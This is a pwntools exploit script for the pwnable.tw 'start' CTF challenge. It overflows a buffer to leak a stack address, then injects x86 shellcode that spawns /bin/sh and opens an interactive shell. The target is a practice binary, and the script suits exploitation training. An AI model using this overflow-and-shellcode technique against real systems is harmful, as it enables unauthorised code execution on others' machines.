from logging import log

from pwn import *
exe = context.binary = ELF("./start")
context.log_level = 'debug'
gs = '''

#b *0x8048087
#b *0x8048097
'''
stack = 0x8048087
def start():
    if args.GDB:
        return gdb.debug(exe.path, gdbscript=gs)
    if args.REMOTE:
        return remote("chall.pwnable.tw", 10000)
    else:
        return process(exe.path)
r = start()
offset = 0x14
def leak():
    r.sendafter(b"Let's start the CTF:", b"A"*offset + p32(stack))
    stack_value = u32(r.recv(4))
    stack_value = stack_value - 0x4
    log.success(f"Leaked stack value: {hex(stack_value)}")
    return stack_value
stack_addr = leak()

shellcode = '''
mov eax, 0x0068732f
push eax
mov eax, 0x6e69622f 
push eax
mov ebx, esp
xor ecx, ecx
xor edx, edx
mov eax, 0xb
int 0x80
''' 

payload =  b"A"*(offset) + p32(stack_addr+0x18)  + asm(shellcode)
log.info(f"Payload length: {len(payload)}")
r.send(payload)

r.interactive()
